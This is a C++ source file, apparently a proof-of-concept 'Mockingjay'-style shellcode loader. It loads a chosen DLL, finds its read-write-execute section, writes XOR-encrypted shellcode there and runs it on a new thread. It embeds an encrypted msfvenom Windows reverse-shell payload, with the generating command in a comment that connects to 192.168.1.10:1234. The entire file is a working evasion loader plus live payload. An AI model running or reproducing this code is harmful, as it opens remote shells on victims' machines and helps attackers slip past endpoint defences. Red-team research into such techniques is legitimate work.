#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <dbghelp.h>
#include <vector>
#include <iomanip>


// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=1234 -f c --encrypt xor --encrypt-key cordonbleu
unsigned char Shellcode[] =
"\x88\x3d\xf1\x90\x9c\x8d\xb4\x75\x72\x74\x2d\x34\x35\x25"
"\x20\x25\x3a\x2d\x45\xa7\x17\x3c\xe7\x37\x14\x3d\xf9\x26"
"\x74\x2d\xff\x27\x52\x3c\xe7\x17\x24\x3d\x7d\xc3\x26\x2f"
"\x39\x44\xbb\x3c\x5d\xa5\xd8\x49\x13\x08\x6e\x49\x54\x34"
"\xb3\xbd\x61\x24\x75\xb4\x90\x99\x3e\x24\x25\x3d\xf9\x26"
"\x4c\xee\x36\x49\x3a\x75\xbc\xee\xf4\xfd\x72\x74\x6c\x2d"
"\xf1\xb5\x06\x13\x24\x64\xa4\x25\xf9\x3c\x74\x21\xff\x35"
"\x52\x3d\x6d\xb5\x97\x23\x3a\x8b\xa5\x24\xff\x41\xfa\x3c"
"\x6d\xb3\x39\x44\xbb\x3c\x5d\xa5\xd8\x34\xb3\xbd\x61\x24"
"\x75\xb4\x4a\x94\x19\x94\x38\x76\x3e\x50\x64\x20\x4d\xa4"
"\x07\xac\x34\x21\xff\x35\x56\x3d\x6d\xb5\x12\x34\xf9\x78"
"\x24\x21\xff\x35\x6e\x3d\x6d\xb5\x35\xfe\x76\xfc\x24\x64"
"\xa4\x34\x2a\x35\x34\x3b\x2d\x2f\x33\x2c\x2d\x3c\x35\x2f"
"\x3a\xf7\x80\x45\x35\x27\x8d\x94\x34\x24\x2d\x2f\x3a\xff"
"\x7e\x8c\x23\x8a\x8d\x8b\x31\x2c\xca\x02\x01\x46\x33\x56"
"\x46\x75\x72\x35\x3a\x2c\xfd\x93\x3a\xf5\x80\xc5\x75\x75"
"\x72\x3d\xe5\x80\x3d\xc9\x70\x74\x68\xb7\xb4\xdd\x7f\x03"
"\x2d\x31\x3d\xfc\x96\x38\xe5\x94\x35\xcf\x3e\x03\x4a\x62"
"\x8b\xa0\x3e\xfd\x86\x0d\x75\x74\x72\x74\x35\x24\xce\x5c"
"\xf2\x1f\x6c\x9a\xa1\x25\x22\x39\x5d\xac\x39\x44\xb2\x3c"
"\x93\xa5\x3c\xfc\xb0\x3c\x93\xa5\x3c\xfc\xb3\x35\xd6\x8f"
"\x7b\xaa\x92\x8b\xb9\x2d\xfd\xb2\x18\x64\x2d\x3d\x38\xfc"
"\x90\x3c\xe5\x9c\x35\xcf\xeb\xd1\x18\x04\x8b\xa0\x3a\xf5"
"\xa8\x25\x76\x75\x72\x3d\xd4\x06\x19\x11\x72\x74\x6c\x65"
"\x74\x34\x22\x35\x3c\x2d\xfd\x97\x25\x23\x3b\x28\x45\xb5"
"\x18\x79\x35\x24\x24\x97\x8e\x12\xab\x21\x50\x21\x73\x75"
"\x24\xe8\x30\x51\x6a\xb2\x6c\x0d\x3c\xfc\x94\x22\x3c\x24"
"\x24\x34\x22\x35\x3c\x2c\x8b\xb5\x33\x24\x25\x9a\xbc\x38"
"\xfb\xb5\x20\xec\xb5\x34\xc8\x0d\xa0\x5a\xf2\x8a\xa7\x3c"
"\x5d\xb7\x3c\x8a\xb8\xff\x62\x24\xce\x7d\xf5\x69\x0c\x9a"
"\xa1\xce\x82\xc1\xce\x33\x35\xcf\xd4\xe1\xd1\xf8\x8b\xa0"
"\x3a\xf7\xa8\x4d\x48\x73\x0e\x7e\xec\x9e\x94\x00\x77\xcf"
"\x2b\x76\x06\x1a\x18\x74\x35\x24\xfd\xaf\x8d\xa1";

struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
};

unsigned char xor_key[256] = {};
size_t keySize = 0;

// Function to convert XOR key argument to unsigned char array
void ConvertXORKey(const char* keyStr, unsigned char* xor_key, size_t keySize) {
    for (size_t i = 0; i < keySize; ++i) {
        xor_key[i] = keyStr[i % strlen(keyStr)];
    }
}

// Function to find offset of RWX section in given DLL
DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                std::cout << "Base Adress : " << std::hex << baseAddress << std::endl;
                std::cout << "Section Offset : " << std::hex << sectionOffset << std::endl;
                return sectionOffset;
            }
            sectionHeader++;
        }
    }
    return 0;
}

// Function to find size of RWX section in given DLL
DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                std::cout << "Size of RWX section : " << std::dec << sectionSize << " bytes" << std::endl;
                return sectionSize;
            }
            sectionHeader++;
        }
    }
    return 0;
}

// Function to compare the size of the RWX section and shellcode
bool IsShellcodeFitting(DWORD_PTR sectionSize, SIZE_T shellcodeSize) {
    return (shellcodeSize <= static_cast<SIZE_T>(sectionSize));
}

// Function to decrypt XOR shellcode
void DecryptShellcode(unsigned char* Shellcode, size_t size, const unsigned char* xor_key, size_t keySize) {
    for (size_t i = 0; i < size; ++i) {
        Shellcode[i] ^= xor_key[i % keySize];
    }
}

// Function to execute Shellcode from RWX section of DLL
void ExecuteShellcode(LPVOID lpParam) {
    unsigned char* shellcode = reinterpret_cast<unsigned char*>(lpParam);

    // Decrypt the shellcode using the xor_key
    const size_t shellcodeSize = sizeof(Shellcode);
    DecryptShellcode(shellcode, shellcodeSize, xor_key, keySize);
    
    // Define a function pointer to the shellcode
    using ShellcodeFunction = void(*)();
    ShellcodeFunction shellcodeFunction = reinterpret_cast<ShellcodeFunction>(shellcode);

    // Call the shellcode function
    std::cout << "Execution of shellcode from RWX Memory Region..." << std::endl;
    shellcodeFunction();
}

// Wrapper function with LPTHREAD_START_ROUTINE signature (not quite sure I got this right). I think it's some kind of bridge between CreateThread() and ExecuteShellcode()
DWORD WINAPI ShellcodeThreadWrapper(LPVOID lpParam) {
    // Call the actual shellcode execution function
    ExecuteShellcode(lpParam);
    return 0;
}

int main(int argc, char* argv[]) {

    std::cout << "\nMOCKINGJAY SUPER ASCII ART\n" << std::endl;

    if (argc != 3) {
        std::cerr << "[!] Error: Please provide the XOR key and the path to the DLL as a positional argument.\n" << std::endl;
        std::cout << "Usage: " << argv[0] << " MY_XOR_KEY PATH_TO_DLL\n" << std::endl;
        return 1;
    }

    // Convert XOR key from argument to array
    keySize = strnlen_s(argv[1], sizeof(xor_key));
    if (keySize > sizeof(xor_key)) {
        std::cerr << "[!] Error: XOR key is too long. Use a key smaller than 256 bytes !\n" << std::endl;
        return 1;
    }
    ConvertXORKey(argv[1], xor_key, keySize);

    // Necessary to convert the DLL path to wide string to properly handle possible spaces in path
    std::wstring dllPath = std::wstring(argv[2], argv[2] + strlen(argv[2]));

    // Load DLL from argument
    HMODULE TargetDLL = ::LoadLibraryW(reinterpret_cast<LPCWSTR>(dllPath.c_str()));

    if (TargetDLL == nullptr) {
        // Failed to load the DLL
        std::cerr << "[!] Failed to load the targeted DLL\n" << std::endl;
        return 1;
    }

    MODULEINFO moduleInfo;
    if (!::GetModuleInformation(::GetCurrentProcess(),TargetDLL,&moduleInfo,sizeof(MODULEINFO))) {
        std::cerr << "[!] Failed to get module info\n" << std::endl;
        return 1;
    }

    // Find the offset and size of RWX section in the DLL
    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(TargetDLL);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(TargetDLL);


    // Access the default RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(moduleInfo.lpBaseOfDll) + RWX_SECTION_OFFSET);
    std::cout << "Address of RWX Section : " << rwxSectionAddr << std::endl;

    SectionDescriptor descriptor = SectionDescriptor{
        rwxSectionAddr, reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(rwxSectionAddr) + RWX_SECTION_SIZE)
    };
    std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;

    // Calculate the size of the shellcode
    const size_t shellcodeSize = sizeof(Shellcode);

    // Check if shellcode can fit in the RWX section
    if (!IsShellcodeFitting(RWX_SECTION_SIZE, shellcodeSize)) {
        std::cerr << "\n[!] Error: Shellcode is too big for the RWX section.\n" << std::endl;
        return 1;
    }

    // Write the shellcode to the RWX section
    std::cout << "Size of shellcode : " << std::dec << shellcodeSize << " bytes" << std::endl;
    errno_t err = memcpy_s(rwxSectionAddr, RWX_SECTION_SIZE, Shellcode, shellcodeSize);
    if (err != 0) {
        std::cerr << "[!] Error: Failed to copy shellcode to RWX section." << std::endl;
        return 1;
    }
    else {
        std::cout << std::dec << shellcodeSize << " bytes of shellcode written to RWX Memory Region" << std::endl;
    }

    // Execute the shellcode on a separate thread
    HANDLE hThread = CreateThread(NULL, 0, ShellcodeThreadWrapper, rwxSectionAddr, 0, NULL);
    if (hThread == NULL) {
        std::cout << "[!] Error creating thread.\n" << std::endl;
        return 1;
    }

    // Wait for the shellcode thread to complete
    WaitForSingleObject(hThread, 3000); //I put 3 seconds to wait and it works with a msfvenom reverse shell. However, I cannot promise it will be enough for every shellcode. Need to fix this. Make a dynamic check or whatever...
    CloseHandle(hThread);

    return 0;
}
